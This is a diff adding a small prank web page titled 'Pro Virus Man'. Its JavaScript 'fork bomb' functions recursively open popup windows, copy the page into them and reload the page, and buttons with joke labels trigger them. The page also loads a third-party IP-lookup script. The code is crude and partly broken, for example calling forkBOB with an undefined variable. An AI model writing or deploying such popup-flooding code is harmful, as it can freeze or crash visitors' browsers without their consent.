@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    <script>
+      function myFunction() {
+        var myWindow = window.open("", "MsgWindow", "width=200,height=100");
+        myWindow.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+        }
+    </script>
+
+    <script>
+      function forkBombtest(c) {
+        for (i = 0; i < c; i++) {
+          location.reload();
+          var w = window.open();
+          var h = window.open("", "MsgWindow", "width=200,height=100");
+          w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+          myFunction();
+          location.reload();
+          
+        }
+      }
+    </script>
+
+      
+    <script>
+      function forkBomb(c) {
+        for (i = 0; i < c; i++) {
+          location.reload();
+          var w = window.open();
+          var h = window.open("", "MsgWindow", "width=200,height=100");
+          w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+          myFunction();
+          forkBomb(1)
+          location.reload();
+        }
+      }
+    </script>
+    <script>
+      function forkBomb2(c) {
+        for (i = 0; i < c; i++) {
+          location.reload();
+          
+          myFunction();
+          forkBomb2(1)
+          location.reload();
+        }
+      }
+    </script>
+    <script>
+      function forkBOB() {
+        forkBomb(1);
+        forkBomb2(1);
+      }
+    </script>
+    <meta charset="utf-8">
+    <title>Pro Virus Man</title>
+  </head>
+  <body>
+    <button type="button" onclick='document.write("HAHA! IHOP")'>Click This If Your Going To IHub</button>
+    <button type="button" onclick="forkBombtest(1)">test this thing ---></button>
+    <button type="button" onclick="forkBomb(1)">#15 The Bob Of The Net</button>
+    <button type="button" onclick="forkBomb2(1)">#15 The Bob Of The Net 2.0 (popups only)</button>
+    <button type="button" onclick="forkBOB(Z)">ForkBOB</button>
+    
+    <!--- Begin WIMI Script ---></p>
+    <div style="text-align: center;"><script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script><script type="text/javascript" src="https://www.whatismyip.com/custom/wimi-script.js"></script></div>
+    <p><!--- End WIMI Script ---><br />
+    
+      </body>
+</html>
